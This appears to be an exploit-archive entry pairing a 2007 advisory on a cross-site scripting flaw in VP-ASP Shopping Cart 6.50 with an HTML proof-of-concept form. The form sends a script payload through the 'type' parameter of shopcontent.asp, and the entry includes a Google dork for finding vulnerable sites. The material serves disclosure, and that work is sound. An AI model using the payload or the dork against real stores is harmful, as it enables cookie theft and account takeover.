@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/24033/info
+
+VP-ASP Shopping Cart is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+VP-ASP Shopping Cart 6.50 is vulnerable; other versions may also be affected. 
+
+<!-- VP-ASP Shopping Cart 6.50 - Cross-Site Scripting Vulnerability A cross-site scripting vulnerability in VP-ASP Shopping Cart 6.50 was discovered. The vendor, VP-ASP, shipped an official patch on May 16th, 2007. Vulnerable Variable: type Vulnerable File: shopcontent.asp Vulnerable: VP-ASP Shopping Cart 6.50 (other versions should also be vulnerable) Google d0rk: intitle:"VP-ASP Shopping Cart 6.50" John Martinelli john@martinelli.com RedLevel Security http://www.RedLevel.org May 16th, 2007 !--> <html> <head><title>VP-ASP Shopping Cart 6.50 - Cross-Site Scripting Vulnerability</title><body> <center><br><br> <font size=4>VP-ASP Shopping Cart 6.50 - Cross-Site Scripting Vulnerability</font><br> <font size=3>discovered by <a href="http://john-martinelli.com">John Martinelli</a> of <a href="http://redlevel.org">RedLevel Security</a><br><br> Google d0rk: <a href="http://www.google.com/search?q=intitle%3A%22VP-ASP+Shopping+Cart+6.50%22">intitle:"VP-ASP Shopping Cart 6.50"</a> </font><br><br><br> <center>file <b>shopcontent.asp</b> - variable <b>type</b> - method <b>get</b></center><br> <form action="http://www.example.com/shop/shopcontent.asp" method="get"> <input size=75 name="type" value="<body onload=alert(1)>"> <input type=submit value="Execute XSS Attack" class="button"> </form> <br><br><br> </form> </body></html> 
